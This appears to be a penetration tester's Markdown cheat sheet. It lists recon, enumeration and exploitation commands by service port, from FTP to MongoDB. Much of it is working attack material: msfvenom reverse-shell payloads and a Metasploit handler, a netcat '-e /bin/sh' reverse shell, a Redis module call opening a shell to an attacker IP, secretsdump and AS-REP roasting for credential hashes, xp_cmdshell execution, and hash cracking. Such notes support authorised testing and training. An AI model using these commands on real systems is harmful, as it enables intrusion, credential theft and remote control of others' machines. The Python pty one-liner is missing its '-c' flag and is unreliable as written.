# Recon & Enum
## The basic
Data and information gathering.

## [nmap](https://nmap.org/book/man.html)
1. Host scan
```
nmap -p 1-65535 -v -A -Pn [IP_ADDR]
nmap -sC -sV -A -p- -v [IP_ADDR]
```

## Commonly seen port (Default port num)
### FTP (21)
```
ftp [IP_ADDR]
anonymous sign in
put [FILE]    # Try for file upload
```

### SSH (22)
```
ssh [USERNAME]@[IP_ADDR] [PORT]
ssh [USERNAME]@[IP_ADDR] -i id_rsa    # chmod 600 id_rsa
ssh -i id_rsa [USERNAME]@[IP_ADDR] -L [LOCAL_PORT]:localhost:[REMOTE_PORT]   # ssh port forwarding  
scp -P [PORT] [FILE_TO_TRANSFER] [USERNAME]@[IP_ADDR]:[DESTINATION_FILE]    # copy file from local to remote through scp

ssh2john.py id_rsa > hash   # encrypted id_rsa
john hash --wordlist=/opt/wordlists/rockyou.txt
```

### DNS (53)
```
dig axfr [DOMAIN].[TLD] @[IP_ADDR]
dig @[IP_ADDR] -x [IP_ADDR]
```

### HTTP (80) / HTTPS (443)
```
gobuster dir -u [URL] -w [WORDLIST] -b "400,404"    # web enumeration, note: windows web server are case insensitive
ffuf -u http://[IP_ADDR]/ -H "Host: FUZZ.[DOMAIN]" -w /seclists/Discovery/DNS/shubs-subdomains.txt -t 100 -fl 10
nikto -h [URL]
davtest -url [URL]    # PUT method test
cadaver [IP_ADDR]
cewl [URL]    # get possible password from site
wpscan --url    # or manually browse to /wp-content/plugins/ if no plugins found
```

### Kerberos (88)
```
kerbrute userenum --dc [DOMAIN] -d [DOMAIN] [WORDLIST]    # enum user
GetNPUsers.py [DOMAIN]/[USERNAME] -request -no-pass -dc-ip [IP_ADDR]    # get user that does not require kerberos preauth
secretsdump.py -dc-ip [IP_ADDR] [DOMAIN].local/[USERNAME]:[PASSWORD]@[IP_ADDR]    # retrieve all of the password hashes
```
Ref: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

### POP3 (110 & 995)
```
telnet [IP_ADDR] [PORT]
USER [USERNAME]
PASS [PASSWORD]
list    # get list of email
retr [#]    # no. of email to read
quit
```

### Network File System (111 & 2049)
```
showmount -e [IP_ADDR]
mount -t nfs [IP_ADDR]:/[Remote_Folder] [Local_Folder]/
```

### SMB (445)
```
smbclient -L [IP_ADDR]    # To list out available directories
smbclient \\\\[IP_ADDR]\\[DIRECTORY]    # To show directory content
smbclient \\\\[IP_ADDR]\\[DIRECTORY] -D [DOMAIN] -U [USERNAME]    # Sign in with username
smbmap -H [IP_ADDR] -u [USERNAME]
lookupsid.py anonymous@$[IP_ADDR]   # with IPC$ readonly permission
secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP_ADDR]   # with ADMIN$ write permission
crackmapexec smb [IP_ADDR] --shares
```
MS17-010 EternalBlue exploitation for SMBv1 in Windows Vista, 7, 8.1, 10; Server 2008, 2012, 2016
SMB share folder mounting
```
mkdir /mnt/[FOLDER_NAME]
mount -t cifs -o username=[USERNAME] //[IP_ADDR]/[SHARED_PATH] /mnt/[FOLDER_NAME]
```
Mounting VHD file
Ref: https://www.how2shout.com/linux/mount-virtual-hard-disk-vhd-file-ubuntu-linux/

### Microsoft SQL (1433)
```
impacket-mssqlclient [DOMAIN]/[USERNAME]@[IP_ADDR] -windows-auth    # Connect to mssql server
SELECT IS_SRVROLEMEMBER('sysadmin')   # Check for sysadmin privileage; return 1 for true, 0 for false
SELECT name FROM master.dbo.sysdatabases    # Retrieve list of databases
EXEC master..xp_cmdshell '[CMD]'    # Execute remote command with sysadmin privileage
```

### MySQL (3306)
```
mysql -u [USERNAME] -h [IP_ADDR] -p   # Connect to mysql server
mysql -u [USERNAME] -h [IP_ADDR] -p -e 'SHOW DATABASES;'
mysql -u [USERNAME] -h [IP_ADDR] -p -e 'USE [DATABASE]; SHOW TABLES;'
```

### RDP (3389)
```
rdesktop -u [USERNAME] [IP_ADDR]:[PORT]
xfreerdp /v:[IP_ADDR] /u:[USERNAME] /p:[PASSWORD] /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
. \\tsclient\share\   # in powershell to access the files in /tmp
```

### Postgresql (5432)
```
psql -U [USERNAME] -p [PORT] -h [HOST] 
```

### Redis (6379)
```
redis-cli -h [IP]   # without auth
redis-cli -h [IP] -a [PASSWORD]   # auth required
----------
info
keys *
type [KEYS]
get [KEYS]    # strings
lrange [KEYS] [1] [64]    # list
----------
# If able to upload file to the system (doesnt matter through http upload or ftp)
# https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
# Compile a module and upload it 
MODULE LOAD /[DIRECTORY]/[TO]/[MODULE].so 
system.rev [ATTACKER_IP] [PORT]
```

### Apache Tomcat (8080)
```
Default page:
/admin
/manager
/manager/html
```

### SPLUNK (8089)
```
Default Credential 
admin:changeme
```

### MongoDB (27017)
```
mongo
show dbs
use [DATABASE]
show collections
db.[COLLECTIONS].find()
```

# Working with MSFVENOM and MSFCONSOLE
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [asp/aspx/php/filetype] > [OUTPUT_FILE.asp/aspx/php/filetype]
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.134 LPORT=4242 -f elf > reverse.elf
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.74 LPORT=21 -f msi> evil.msi

----------------------------------
msfconsole:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp   # payload match with the one used in venom
run     # start listener

----------------------------------
meterpreter session:
getuid     # get current user session
sysinfo    # get information of the remote system
background / ctrl+z
use post/multi/recon/local_exploit_suggester    # set session number
```
## Cisco router password cracker
https://github.com/axcheron/cisco_pwdecrypt  
https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html

## Netcat
Listener (on attacker machine) and reverse shell command
```
nc -lnvp [PORT]
nc [IP_ADDR] [PORT] -e /bin/sh    # reverse shell
l = listen; n = ip addresses only, no DNS lookup; v = verbose; p = local port
```

## John
```
john [hash_file] --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
```

## Hashcat
```
hashcat -a 3 -m 0 [HASH_FILE] /usr/share/wordlists/rockyou.txt    # -a 3 bruteforce attack; -m 0 MD5 mode
```
Ref: https://hashcat.net/wiki/doku.php?id=example_hashes

## Python
```
python3 'import pty;pty.spawn("/bin/bash");'
```

## Port Knocking
```
systemctl start knockd
knock [IP_ADDR] [PORT1] [PORT2] [PORT3] -d [DELAY MILLISEC]
```

# Checklist
:white_check_mark: port scan <br />
:white_check_mark: password reuse <br />
:white_check_mark: check version for vulnerabilities and exploit <br />
